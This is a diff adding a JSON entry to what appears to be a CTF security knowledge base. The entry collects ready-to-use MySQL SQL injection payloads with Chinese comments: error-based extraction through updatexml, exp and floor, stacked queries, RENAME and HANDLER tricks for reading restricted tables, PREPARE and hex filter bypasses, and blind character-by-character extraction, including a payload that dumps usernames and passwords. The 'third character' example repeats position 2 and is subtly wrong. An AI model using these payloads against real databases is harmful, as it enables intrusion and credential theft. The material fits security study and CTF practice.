@@ -1,0 +1,100 @@
+{
+  "id": "payload-sql_injection-001",
+  "type": "payload",
+  "category": "injection",
+  "subcategory": "sql_injection",
+  "name": "SQL Payload 集合",
+  "description": "从 SQL.md 提取的实战 Payload",
+  "payloads": [
+    {
+      "payload": "#updatexml()函数\r\n1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)# //爆库\r\n1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='库名' limit 0,1),0x7e),1)# //查表名\r\n1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='库名' and table_name='表名' limit 0,1),0x7e),1)# //查列名\r\n1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)# //查数据",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "#BigInt数据类型溢出--exp()或pow()\r\n1' and exp(~(select * from (select user())a))# //查看当前库的权限\r\n1' and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))# //查表名\r\n1' and exp(~(select * from (select column_name from information_schema.columns where table_name='表名' limit 0,1)a))# //查列名\r\n1' and exp(~(select * from(select '列名' from '表名' limit 0,1)))# //获取对应信息",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "#floor()函数\r\n1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)#",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "1';show databases;# //查库名·\r\n1';show tables;# //查表名\r\n1';show columns from `表名`;# //查列名,表名用反引号包围",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "1';RENAME TABLE `表1` TO `表2`;RENAME TABLE `表3` TO `表1`;ALTER TABLE `表1` CHANGE `列1` `列2` VARCHAR(100) ;show columns from 表1;# //将表1改名为表2，将表3改名为表1，再将表1的列1改为列2，最后查看表1的列名信息 //适用于查看没有权限的表",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "1';HANDLER 表名 OPEN;HANDLER 表名 READ FIRST;HANDLER 表名 CLOSE;# //此方法使用于在查列时select被禁的情况，逻辑为打开指定表名，读取表中第一行数据，关闭表并释放资源。",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "1;set sql_mode=PIPES_AS_CONCAT;select 1 //适用于后端代码采用'||'判断的情况。",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "PREPARE hacker from concat('s','elect', ' * from `表名` ');\r\nEXECUTE hacker;# //绕过特定字符串的过滤\r\nset@a=hex编码值;prepare hacker from @a;execute hacker;# //结合hex(进制)编码实现绕过",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "1' and length(database())>20 #\r\n//判断数据库名称长度是否大于20",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "SELECT length('Hello World');  -- 输出 11\r\nSELECT length(column_name) FROM table_name;  -- 计算表中某一列的长度",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "1' and ascii(substr(database(),1,1))>20 #",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "1' and (select count(table_name) from information_schema.tables where table_schema=database()) <10#",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) > 10 #",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    },
+    {
+      "payload": "//第一个字符\r\n1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))判断表达式 #     \r\n\r\n//第二个字符\r\n1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))判断表达式 #     \r\n\r\n//第三个字符\r\n1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))判断表达式 #",
+      "context": "SQL注入",
+      "source": "SQL.md"
+    }
+  ],
+  "related_theory": [
+    "theory-sql-injection-001"
+  ],
+  "related_pocs": [
+    "pocs/high_value/afrog\\afrog-pocs\\CVE\\2022\\CVE-2022-21661.yaml"
+  ],
+  "tags": [
+    "SQL注入",
+    "SQLi",
+    "数据库注入",
+    "injection"
+  ],
+  "severity": "high",
+  "source": "Des-CTF-Knowledge/SQL.md",
+  "last_updated": "2026-10-22"
+}
